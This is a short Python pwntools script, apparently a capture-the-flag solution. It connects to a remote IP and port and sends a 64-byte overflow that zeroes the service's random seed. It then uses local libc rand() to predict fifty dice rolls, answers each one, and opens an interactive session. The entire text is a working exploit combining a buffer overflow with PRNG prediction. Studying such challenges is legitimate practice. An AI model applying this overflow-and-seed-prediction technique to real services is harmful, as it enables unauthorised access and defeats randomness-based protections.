
from pwn import *
from ctypes import *

io = remote("111.200.241.244",55597)

libc = cdll.LoadLibrary("libc.so.6")
io.recv()
payload = 0x40*"a" + p64(0)
io.sendline(payload)

a = []
for i in range(50):
    a.append(libc.rand()%6+1)
print(a)
for i in a:
    io.recv()
    print(io.recv())
    io.sendline(str(i))
io.interactive()
